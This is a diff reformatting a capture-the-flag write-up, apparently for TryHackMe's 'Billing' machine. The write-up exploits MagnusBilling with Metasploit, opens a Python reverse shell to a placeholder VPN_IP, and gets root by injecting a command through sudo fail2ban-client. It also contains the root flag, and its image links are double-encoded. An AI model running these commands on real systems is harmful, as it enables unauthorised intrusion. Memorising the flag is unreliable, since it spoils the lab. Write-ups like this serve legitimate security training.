@@ -2,50 +2,54 @@
 sticker: emoji//1f4b3
 ---
 
-# BILLING
+# PORT SCAN
+---
 
-## PORT SCAN
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121156.png)
+# RECONNAISSANCE
+---
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121156.png)
 
 Once we go to the web application, we can check this is working with something called `MagnusBilling`, we know this because a little moment before going into the web application, this loads in:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121421.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121421.png)
 
 **MagnusBilling** is an open-source VoIP billing and call accounting platform designed for service providers, call shops, and enterprises. It provides comprehensive solutions for call routing, rate management, user provisioning, and real-time billing. Built on a LAMP/LEMP stack, it supports integration with major VoIP protocols (SIP, IAX) and hardware, featuring web-based management, fraud detection, and multi-tenant capabilities.
 
 If we search info related to this, we can find this exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121504.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121504.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121513.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121513.png)
+
 
 Based on that, let's search a module on `metasploit`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121650.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121650.png)
 
 Same exploit as the one above, let's proceed with exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121837.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121837.png)
 
 Now, set options and run the exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612121935.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612121935.png)
+
 
 We got our meterpreter shell, I will switch to a netcat shell for a better experience:
 
@@ -55,13 +59,14 @@ meterpreter > shell
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("VPN_IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612122241.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612122241.png)
 
 Let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
 
 First step is to stabilize our shell:
 
@@ -75,27 +80,28 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612122406.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612122406.png)
 
 We got a shell as `asterisk`, let's use linpeas and check what can we do to escalate our privileges:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612122904.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612122904.png)
 
 We can run `fail2ban-client` binary, in a previous machine, specifically `biteme`, a similar privilege escalation was done with this binary but in that case we could reset the service of `fail2ban`, let's check how to exploit it in this case:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612123256.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612123256.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612123306.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612123306.png)
 
 That would work but we don't have write permissions over the `iptables.conf` file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612123407.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612123407.png)
 
 Unfortunately, this is not the path, but, investigating further we can find this article:
 
-Article: https://exploit--notes-hdks-org.translate.goog/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/?\_x\_tr\_sl=en&\_x\_tr\_tl=es&\_x\_tr\_hl=es&\_x\_tr\_pto=tc
+Article: https://exploit--notes-hdks-org.translate.goog/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612123516.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612123516.png)
 
 Let's replicate the PoC:
 
@@ -129,7 +135,7 @@ sudo /usr/bin/fail2ban-client set mbilling_ddos action evil actionban "chmod +s 
 sudo /usr/bin/fail2ban-client set mbilling_ddos banip 1.2.3.5
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612123848.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612123848.png)
 
 As seen, we get a root shell following the PoC, let's get both flags:
 
@@ -141,4 +147,5 @@ bash-5.2# cat /root/root.txt
 THM{33ad5b530e71a172648f424ec23fae60}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612124033.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612124033.png)
+
